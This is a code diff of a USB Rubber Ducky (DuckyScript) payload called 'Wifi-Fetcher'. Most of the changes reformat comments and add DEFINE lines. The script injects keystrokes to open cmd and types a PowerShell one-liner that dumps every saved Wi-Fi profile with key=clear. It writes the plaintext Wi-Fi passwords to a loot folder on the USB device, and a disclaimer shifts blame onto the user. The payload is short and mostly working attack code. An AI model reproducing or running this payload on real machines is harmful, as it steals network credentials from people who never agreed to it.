@@ -1,18 +1,21 @@
 REM DISCLAIMER: the end User of the Script IS the only Person Held responsible for the harm or leak of information caused by the payload, Neither the creator of the Script nor the Distribute(Hak5 LLC.) shall BE Held responsible for any damages caused.
 
-
-REM INSTRUCTIONS: IF YOU DONT HAVE THE  DIRECTORY D:\loot\PwnedWIFI\ On THE DUCKY, THIS SCRIPT WILL NOT WORK, EITHER CREATE THE DIRECTORY OR MODIFY THE PAYLOAD TO STORE THE OUTPUT FILE ELSEWHERE
+REM INSTRUCTIONS: IF YOU DON'T HAVE THE DIRECTORY D:\loot\PwnedWIFI\ ON THE DUCKY, THIS SCRIPT WILL NOT WORK. EITHER CREATE THE DIRECTORY OR MODIFY THE PAYLOAD TO STORE THE OUTPUT FILE ELSEWHERE
 REM After creating the directory and adjusting the delays, it IS basically plug 'n play
+
+DEFINE DISC "the end User of the Script IS the only Person Held responsible for the harm or leak of information caused by the payload, Neither the creator of the Script nor the Distribute(Hak5 LLC.) shall BE Held responsible for any damages caused."
+
+DEFINE INSTR "IF YOU DON'T HAVE THE DIRECTORY D:\loot\PwnedWIFI\ ON THE DUCKY, THIS SCRIPT WILL NOT WORK. EITHER CREATE THE DIRECTORY OR MODIFY THE PAYLOAD TO STORE THE OUTPUT FILE ELSEWHERE"
 
 REM NAME: Wifi-Fetcher
 REM AUTHOR: nightcrafttrl1
 REM DEVICE: RubberDucky
 REM TARGETS: WINDOWS 7 or greater
-REM DESCRIPTION: This payload will fetch the windows system
-REM for the passwords and other info about every wifi network the system can connect to
+REM DESCRIPTION: This payload will fetch the windows system for the passwords and other info about every wifi network the system can connect to
 REM credits:ChatGPT helped a little here and there
 REM DEPENDENCIES: NONE
 DELAY 1000
+
 REM Switch to HID STORAGE mode
 ATTACKMODE HID STORAGE
 DELAY 4000
@@ -21,6 +24,7 @@ DELAY 100
 STRING cmd
 ENTER
 DELAY 300
+
 REM Fetch and Save
 STRING powershell -c "netsh wlan show profiles | Select-String 'All User Profile\s*:\s*(.+)' | ForEach-Object { $_ -match 'All User Profile\s*:\s*(.+)'; $matches[1] } | ForEach-Object { netsh wlan show profile name=$_ key=clear } | Out-File -FilePath 'D:\loot\PwnedWIFI\all_wifi_info.txt'; netsh wlan export profile key=clear | Out-File -Append -FilePath 'D:\loot\PwnedWIFI\all_wifi_passwords.txt';"
 ENTER
